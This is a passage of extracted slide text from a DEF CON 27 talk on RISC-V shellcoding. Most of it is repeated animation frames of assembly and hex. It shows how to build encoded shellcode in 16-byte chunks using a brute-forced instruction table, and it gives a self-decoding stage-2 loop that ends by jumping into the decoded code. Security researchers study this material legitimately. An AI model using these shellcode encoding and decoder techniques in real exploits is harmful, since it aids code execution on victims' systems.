addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
0000 0000 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
00 00
00 00
A0 31
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
0000 0000 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
00 00
00 00
j 12
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
0000 0000 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
00 00
00 00
j 12
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
0000 0000 0000 0000
a0
4000 5971 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
00 00
00 00
j 12
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
000c 0000 0000 0000
a0
4000 5971 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
00 00
00 00
j 12
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
000c 0000 0000 0000
a0
4000 5971 0000 0000
t1
9714 0005 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
00 00
00 00
j 12
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
000c 0000 0000 0000
a0
4000 5971 0000 0000
t1
970a 0005 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
97 A0
00 05
j 12
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
000c 0000 0000 0000
a0
4000 5971 0000 0000
t1
970a 0005 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
97 A0
00 05
j 12
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
000c 0000 0000 0000
a0
4000 5971 0000 0000
t1
970a 0005 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
add a4,a4,sp
00 05
j 12
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
000c 0000 0000 0000
a0
4000 5971 0000 0000
t1
970a 0005 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
add a4,a4,sp
c.nop 1
j 12
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
000c 0000 0000 0000
a0
4000 5971 0000 0000
t1
970a 0005 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
Solution: use 16-byte chunks
add a4,a4,sp
c.nop 1
j 12
...
0
2
4
6
· · ·
16
sra
s4 ,zero ,s3
amoand.d.rl zero ,s4 ,(sp)
amoor.d.aq
a6 ,tp ,(sp)
lui
a0 ,0 x59714
li
s4 ,12
sra
t1 ,a0 ,s4
addiw
t1 ,t1 ,-10
amoor.w.aq
t5 ,t1 ,(sp)
tp
0000 0000 A031 0004
s4
000c 0000 0000 0000
a0
4000 5971 0000 0000
t1
970a 0005 0000 0000
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
30 / 42
The majik table
Make bruteforce great again
⌅ Iterate on all instructions sequences in the form lui, sra, addiw
⌅ Make sure that bytes 2 and 3 are nop-like
⌅ Keep the shortest sequence for each 2-byte value
⌅ Write your stage 2 with the available 2-byte values
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
31 / 42
0f10 0000
a031
...
7d77
0005
a031
...
0a97
0005
a031
...
c145
0001
a031
...
9a05
0001
a031
...
3a85
0005
a031
...
ba86
0005
a031
...
4041
0001
a031
...
a287
0005
a031
...
9183
0001
a031
...
0905
0001
a031
...
3d8c
005e
a031
...
00c3
0001
a031
...
0507
0005
a031
...
f915
0001
a031
...
c1f1
02f2
a031
...
0f10 0000
a031
...
8296
0003
a031
...
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
32 / 42
fence.i
jmp 12
...
lui a4,0xfffff
c.nop 1
jmp 12
...
add a4,a4,sp
c.nop 1
jmp 12
...
li a1,16
nop
jmp 12
...
slli a1,a1,0x6
nop
jmp 12
...
mv a0,a4
c.nop 1
jmp 12
...
mv a3,a4
c.nop 1
jmp 12
...
lw s0,4(a0)
nop
jmp 12
...
mv a5,s0
c.nop 1
jmp 12
...
srli a5,a5,0x4
nop
jmp 12
...
addi a0,a0,2
nop
jmp 12
...
xor s0,s0,a5
c.slli zero,0x17
jmp 12
...
sw s0,0(a4)
nop
jmp 12
...
addi a4,a4,1
c.nop 1
jmp 12
...
addi a1,a1,-2
nop
jmp 12
...
bnez a1,-256
slli t0,t0,0x1c
jmp 12
...
fence.i
jmp 12
...
jalr a3
n/a
jmp 12
...
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
32 / 42
fence.i
jmp 12
...
lui a4,0xfffff
c.nop 1
jmp 12
...
add a4,a4,sp
c.nop 1
jmp 12
...
li a1,16
nop
jmp 12
...
slli a1,a1,0x6
nop
jmp 12
...
mv a0,a4
c.nop 1
jmp 12
...
mv a3,a4
c.nop 1
jmp 12
...
lw s0,4(a0)
nop
jmp 12
...
mv a5,s0
c.nop 1
jmp 12
...
srli a5,a5,0x4
nop
jmp 12
...
addi a0,a0,2
nop
jmp 12
...
xor s0,s0,a5
c.slli zero,0x17
jmp 12
...
sw s0,0(a4)
nop
jmp 12
...
addi a4,a4,1
c.nop 1
jmp 12
...
addi a1,a1,-2
nop
jmp 12
...
bnez a1,-256
slli t0,t0,0x1c
jmp 12
...
fence.i
jmp 12
...
jalr a3
n/a
jmp 12
...
The ABC of Next-Gen Shellcoding @ DEF CON 27
11 Aug 2019
32 / 42
0f10 0000
a031
...
7d77
0005